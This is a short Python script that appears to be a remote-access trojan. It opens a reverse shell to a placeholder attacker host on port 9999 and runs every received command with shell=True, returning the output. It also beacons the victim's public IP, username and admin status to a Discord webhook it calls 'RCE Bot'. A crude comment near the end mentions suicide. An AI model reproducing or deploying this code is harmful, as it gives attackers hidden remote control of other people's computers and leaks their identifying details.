from multiprocessing.connection import wait
import socket
import os
import subprocess
from time import sleep
import requests
from requests import get
import ctypes

s = socket.socket()
host = "ip"
port = 9999

def isAdmin():
    try:
        is_admin = os.getuid() == 0
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    return is_admin

def start():

    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.connect((host, port))

    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == "cd":
            os.chdir(data[3:].decode("utf-8"))

        if len(data) > 0:
            cmd = subprocess.Popen(
                data[:].decode("utf-8"),
                shell=True,
                stdout=subprocess.PIPE,
                stdin=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte, "utf-8")
            currentWD = os.getcwd() + "> "
            s.send(str.encode(output_str + currentWD))

            print(output_str)

def post():
    if isAdmin():
        Admin = "Admin"
    else:
        Admin = "Not Admin"

    User = os.getlogin()

    IP = get("https://api.ipify.org").text

    url = "discordwebhook"
    data = {"content": "", "username": "RCE Bot"}
    data["embeds"] = [
        {"description": IP, "title": "New client connection"},
        {"description": Admin, "title": "Checking admin status"},
        {"description": User, "title": "Checking username"},
    ]
    response = requests.post(url, json=data)


# im going to commit suicide i swear to fucking god IF ELSE IF ELSE IF ELSE


post()
start()
